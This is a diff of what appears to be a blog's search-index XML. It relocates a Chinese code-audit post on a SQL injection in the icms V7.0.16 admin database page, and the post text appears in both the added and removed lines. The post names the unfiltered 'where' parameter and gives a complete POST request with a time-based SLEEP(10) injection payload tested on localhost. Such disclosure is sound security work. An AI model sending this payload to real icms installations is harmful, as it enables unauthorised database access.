@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>icms V7.0.16 后台数据管理处sql注入</title>
+      <link href="2023/08/01/icms_time_sql/"/>
+      <url>2023/08/01/icms_time_sql/</url>
+      
+        <content type="html"><![CDATA[<p>1、漏洞出现位置<br> <img src="https://user-images.githubusercontent.com/37917782/259279133-135d5693-6e8d-48ec-b374-f13333c870cc.png" alt="image"></p><p>2、有问题代码：database.admincp.php中的230行<br> <img src="https://user-images.githubusercontent.com/37917782/259279155-ed62d7d0-6a10-4416-8534-c5659905f90e.png" alt="image"></p><p>3、219行传入的where参数，不经过过滤，直接带入230行中的sql执行语句<br> <img src="https://user-images.githubusercontent.com/37917782/259279168-fa517029-cb77-4c9e-8099-d5da50a7ca1f.png" alt="image"></p><p>4、所以在参数where进行拼接，造成where条件句sql注入，尝试进行手工注入，数据包如下<br>POST /icms/admincp.php?app=database&amp;do=query&amp;frame=iPHP&amp;CSRF_TOKEN=fe334f6fgxSmDHDpZeekNtohnt-hBYXBAOJkd5xXq_XXz5vaYOwEoS_nJrEdZo26EJVC0fA0SkLpfBFFzcE4ly18oxAoBMoCTr22qJ8 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 108<br>Origin: <a href="http://localhost/">http://localhost</a><br>Connection: close<br>Referer: <a href="http://localhost/icms/admincp.php?app=database&amp;do=replace">http://localhost/icms/admincp.php?app=database&amp;do=replace</a><br>Cookie: iCMS_ADMIN_AUTH=23f0a4caAp2o-gYF7T1PFGTY0fdLZd43ZdGHuQY1NnyOjOUDHZxyC_CewgaX5uR1iNHfEz_Pj20qTaPC_NZlv9CKoxpPtJ80fBz7nbiMensa6tkGlbYrpw; XDEBUG_SESSION=11807<br>Upgrade-Insecure-Requests: 1</p><p>field=tkd&amp;pattern=123123&amp;replacement=1231321&amp;where=where+id=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(10)))testsql)</p><p>5、执行成功，效果如图：<br> <img src="https://user-images.githubusercontent.com/37917782/259279173-7eeadb88-7c27-4e71-800a-6ee22c6030f7.png" alt="image"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 代码审计 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Linux下本机与远程主机文件传输(命令行)</title>
       <link href="2022/07/13/Linux%E4%B8%8B%E6%9C%AC%E6%9C%BA%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
       <url>2022/07/13/Linux%E4%B8%8B%E6%9C%AC%E6%9C%BA%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93-%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
@@ -15,25 +34,6 @@
         <tags>
             
             <tag> linux 文件传输 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>icms V7.0.16 后台数据管理处sql注入</title>
-      <link href="2022/07/13/icms_time_sql/"/>
-      <url>2022/07/13/icms_time_sql/</url>
-      
-        <content type="html"><![CDATA[<p>1、漏洞出现位置<br> <img src="https://user-images.githubusercontent.com/37917782/259279133-135d5693-6e8d-48ec-b374-f13333c870cc.png" alt="image"></p><p>2、有问题代码：database.admincp.php中的230行<br> <img src="https://user-images.githubusercontent.com/37917782/259279155-ed62d7d0-6a10-4416-8534-c5659905f90e.png" alt="image"></p><p>3、219行传入的where参数，不经过过滤，直接带入230行中的sql执行语句<br> <img src="https://user-images.githubusercontent.com/37917782/259279168-fa517029-cb77-4c9e-8099-d5da50a7ca1f.png" alt="image"></p><p>4、所以在参数where进行拼接，造成where条件句sql注入，尝试进行手工注入，数据包如下<br>POST /icms/admincp.php?app=database&amp;do=query&amp;frame=iPHP&amp;CSRF_TOKEN=fe334f6fgxSmDHDpZeekNtohnt-hBYXBAOJkd5xXq_XXz5vaYOwEoS_nJrEdZo26EJVC0fA0SkLpfBFFzcE4ly18oxAoBMoCTr22qJ8 HTTP/1.1<br>Host: localhost<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 108<br>Origin: <a href="http://localhost/">http://localhost</a><br>Connection: close<br>Referer: <a href="http://localhost/icms/admincp.php?app=database&amp;do=replace">http://localhost/icms/admincp.php?app=database&amp;do=replace</a><br>Cookie: iCMS_ADMIN_AUTH=23f0a4caAp2o-gYF7T1PFGTY0fdLZd43ZdGHuQY1NnyOjOUDHZxyC_CewgaX5uR1iNHfEz_Pj20qTaPC_NZlv9CKoxpPtJ80fBz7nbiMensa6tkGlbYrpw; XDEBUG_SESSION=11807<br>Upgrade-Insecure-Requests: 1</p><p>field=tkd&amp;pattern=123123&amp;replacement=1231321&amp;where=where+id=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(10)))testsql)</p><p>5、执行成功，效果如图：<br> <img src="https://user-images.githubusercontent.com/37917782/259279173-7eeadb88-7c27-4e71-800a-6ee22c6030f7.png" alt="image"></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 代码审计 </tag>
             
         </tags>
       
